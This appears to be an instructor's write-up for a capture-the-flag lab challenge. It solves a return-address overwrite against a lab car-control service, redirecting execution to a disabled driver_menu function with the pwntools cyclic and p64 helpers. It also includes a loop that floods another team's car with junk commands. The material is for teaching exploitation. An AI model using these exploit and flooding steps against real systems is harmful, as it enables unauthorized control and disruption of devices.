# Pwn My Ride

Browsing to http://car, we see the following message.

```
Welcome to Pwn My Ride 0x1337
--------------------------------------------------------------------------------
We found out that a hacker tried to steal our car. We noticed her developing an 
exploit to remotely control the car. We do not think its possible since the     
driver_menu function has been disabled in the remote car service. But management
still would like you to take a look and report back.
--------------------------------------------------------------------------------
The hacker got frustrated and quit but left her exploit script on the target.
We need you to investigate and figure out if you can take over the car.
--------------------------------------------------------------------------------
The hacker left a note that we think may help.
Step 1: Figure out how many bytes to crash program using GDB debugger.
Step 2: Figure out address of driver_menu using gdb command x/i driver_menu.
Step 3: Send exploit, wait, and then send direction command.
--------------------------------------------------------------------------------
One of our techs was playing with the hackers exploit.py script
They determined the script has some ???  where the hacker was not finished.
You can edit the script with nano exploit.py. Remember CTRL-X to save the edits.
You can then launch the script against the GDB debugger, using the command

python3 exploit.py GDB

You can then launch it remotely against the car server using the commands

python3 exploit.py REMOTE
--------------------------------------------------------------------------------
Good luck! This is the final challenge.
```

## Solution

We will edit the script to send a large cyclic pattern and see if we can determine when we overflow the next instruction. We will change ``payload = cyclic(???)`` to ``payload = cyclic(100)`` and then run ``python3 exploit.py GDB``

We see that the debugger crashes with the error message ``Invalid address 0x61616861616167``. This means that the program is trying to execute an instruction at this memory address. Unfortunately this is not a valid memory address. It is actually just letters from our cyclic pattern if we type ``unhex 61616861616167``, we'll see it responds with ``aahaaag``. We will determine the offset of this pattern by using the ``cyclic`` command at the command prompt (Note - although gdb allows using cyclic, it does not work well. Have students exit and perform the cyclic command from the command prompt.)

```
cyclic -l 0x61616861616167
24
```

Here we see that at 24 bytes into our cyclic pattern, we gain control of the address of the next instruction. For example, let us send the invalid address 0xdeadbeef as the location of the next instruction. If everything works correctly, the debugger should report a crash indicating that it could not perform the instruction at the address 0xdeadbeef. After editing ``exploit.py`` with the following:

```python
payload = cyclic(24) 
payload += p64(0xdeadbeef)
```

we run ``python3 exploit.py GDB`` and observe the results. The debugger reports ``Invalid address 0xdeadbeef``. This is great! We now know we can control the next instruction. All we have to do is provide it an address of valid instruction(s) we'd like to execute. The prompt indicated that if we ran ``x/i driver_menu`` in GDB, it would provide use the address of the driver menu function.

```gdb
x/i driver_menu
 0x400d40 <driver_menu>:      stp     x29, x30, [sp, #-32]!
```

Here, we see that the debugger tells us ``0x400d40`` is the address of driver_menu. We can update our ``exploit.py`` script as folloing.

```python
payload = cyclic(24) 			# overflow bytes to crash program
payload += p64(0x400d40)		# address to execute after crash
```

Now that we have a working exploit, let us trying it against the remote target. Running the following command runs our exploitly remotely against the car.

```
python3 exploit.py REMOTE

```

After running we are presented with a prompt ``$``. But the car does nothing. We are reminded that this is the ``driver_menu`` function and it is expecting car commands like ``w,a,s,d`` to move the car. We enter ``w`` at the prompt and see the following message as the car moves forward.

```
$ w
w<<< Sending Command: u
```

## Prompts

0. How can we determine the number of bytes to crash a program? Using cyclic since it provides a large non-repeatable sequence. We send in a large cyclic(100) and then determine how many bytes in crashed our program.

1. How can we verify we are at the right overflow offset? By sending in an invalid address like 0xdeadbeef, we can check and make sure this causes the program to crash at this address.


## Helpful Pivots for Students

0. How can we move the car multiple moves? By putting additional lines into our script after the exploit succeeds. For example you could send the konami code using:

```python
konami = [b'w',b'w',b's',b's',b'a',b'd',b'a',b'd']
for move in konami:
   time.sleep(0.1)
   p.sendline(move)

p.interactive()
```

1. How could you disable another team's car? By infinitely sending incorrect commands to the car's queue. The following code will overflow the cars direction queue, preventing valid instructions from arriving.  

```python
while True:
   time.sleep(0.1)
   p.sendline(b'x')
```
